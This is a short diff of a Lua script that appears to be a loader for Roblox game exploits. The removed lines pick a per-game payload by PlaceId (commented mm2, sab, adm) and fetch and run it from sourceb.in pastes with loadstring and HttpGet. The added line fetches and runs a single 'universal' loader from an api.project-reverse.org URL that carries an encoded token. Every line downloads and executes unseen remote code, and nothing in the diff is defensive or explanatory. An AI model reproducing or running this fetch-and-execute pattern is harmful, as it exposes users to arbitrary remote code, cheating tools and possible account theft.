@@ -1,7 +1,1 @@
-if game.PlaceId == 142823291 then -- mm2
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/1O441UzNCB/0"))()
-elseif game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then -- sab
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/bV4lnQdMzv/0"))()
-elseif game.PlaceId == 920587237 or game.PlaceId == 132388544979740 then -- adm
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/da7RCzCYHG/0"))()
-end
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImFlNjAzNTk1LWRjOTctNGMwNC1hZjY0LTVjOWE0YmZjMzE0ZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
